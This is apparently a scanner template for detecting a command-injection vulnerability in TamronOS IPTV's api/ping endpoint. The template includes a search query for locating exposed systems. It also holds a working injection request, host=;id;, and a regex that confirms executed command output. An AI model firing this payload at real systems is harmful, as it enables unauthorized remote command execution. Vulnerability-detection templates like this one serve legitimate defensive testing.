expression: r0()
id: tamron-os-iptv-ping-rce
info:
  author: daffainfo
  description: "TamronOS IPTV/VOD\u7CFB\u7EDF\u662F\u4E00\u5957\u57FA\u4E8ELinux\u5185\
    \u6838\u5F00\u53D1\u7684\u5BBD\u5E26\u8FD0\u8425\u5546\u3001\u9152\u5E97\u3001\
    \u5B66\u6821\u76F4\u64AD\u70B9\u64AD\u4E00\u4F53\u89E3\u51B3\u65B9\u6848\uFF0C\
    \u7CFB\u7EDF\u63D0\u4F9B\u4E86\u591A\u79CD\u5BA2\u6237\u7AEF\uFF08Android\u673A\
    \u9876\u76D2\u3001\u7535\u89C6\u3001PC\u7248\u70B9\u64AD\u3001\u624B\u673A\u7248\
    \u70B9\u64AD\uFF09\u65B9\u4FBF\u7528\u6237\u901A\u8FC7\u4E0D\u540C\u7684\u8BBE\
    \u5907\u63A5\u5165\u3002TamronOS IPTV\u7CFB\u7EDF api/ping \u5B58\u5728\u4EFB\u610F\
    \u547D\u4EE4\u6267\u884C\u6F0F\u6D1E\uFF0C\u653B\u51FB\u8005\u901A\u8FC7\u6F0F\
    \u6D1E\u53EF\u4EE5\u6267\u884C\u4EFB\u610F\u547D\u4EE4\u3002\nfofa-query: app=\"\
    TamronOS-IPTV\u7CFB\u7EDF\"\n"
  name: "TamronOS IPTV\u7CFB\u7EDF ping \u4EFB\u610F\u547D\u4EE4\u6267\u884C\u6F0F\
    \u6D1E"
  reference:
  - https://mp.weixin.qq.com/s/-Nh_ptkpfQ7jxszQyzT9gQ
  severity: critical
  verified: true
rules:
  r0:
    expression: response.status == 200 && "((u|g)id|groups)=[0-9]{1,4}\\([a-z0-9]+\\)".bmatches(response.body)
    request:
      method: GET
      path: /api/ping?count=5&host=;id;
